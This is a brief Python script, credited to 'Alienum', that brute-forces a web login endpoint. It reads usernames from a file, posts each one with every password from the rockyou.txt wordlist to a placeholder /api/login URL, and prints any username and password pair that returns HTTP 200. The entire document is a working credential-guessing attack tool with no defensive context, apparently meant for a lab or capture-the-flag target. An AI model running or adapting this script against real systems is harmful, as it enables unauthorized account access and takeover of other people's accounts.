import requests
import sys
#Made by Alienum
url = 'http://x.x.x.x/api/login'
with open('user.txt') as users:
  for u in users:
    with open('/usr/share/wordlists/rockyou.txt') as file:
      for line in file:
          user = {"username":u.strip(),"password":line.strip()}
          r =  requests.post(url,data = user)
          if r.status_code == 200:
             print('[+] Username : '+ u)
             print('[+] Password : '+ line)
             break
          
